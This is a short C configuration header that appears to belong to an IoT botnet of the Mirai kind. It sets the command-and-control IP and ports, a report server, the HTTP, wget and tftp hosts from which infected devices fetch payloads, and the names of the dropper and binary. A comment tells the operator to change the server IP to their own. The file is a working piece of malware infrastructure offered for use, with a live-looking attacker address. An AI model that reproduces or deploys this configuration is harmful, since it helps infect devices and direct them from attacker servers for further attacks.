//bot config.
#define bot_port 3388
#define rep_port 7485
#define bot_ip "139.59.65.77"
#define rep_ip "139.59.65.77"

#define ensure_single_port 23232

//dlr config.
#define HTTP_SERVER utils_inet_addr(139,59,65,77) // CHANGE TO YOUR HTTP SERVER IP

//loader config.
#define wgetip "139.59.65.77"
#define tftpip "139.59.65.77"
#define FN_DROPPER  "droptha"
#define FN_BINARY   "nembinry"

